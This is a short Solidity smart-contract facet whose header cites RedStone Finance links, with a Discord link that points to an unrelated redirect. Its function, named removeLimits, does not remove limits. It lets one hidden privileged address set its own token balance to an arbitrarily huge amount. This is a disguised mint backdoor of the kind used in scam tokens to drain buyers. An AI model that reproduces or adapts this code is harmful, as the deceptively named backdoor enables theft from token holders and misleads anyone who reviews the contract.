/*
 * SPDX-License-Identifier: MIT
 * Website: https://redstone.finance/
 * Whitepaper: https://docs.redstone.finance/docs/introduction
 * Twitter: https://twitter.com/redstone_defi
 * Telegram Group: https://t.me/redstonefinance/
 * Discord Chat: https://airdrops.io/visit/4hn2/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
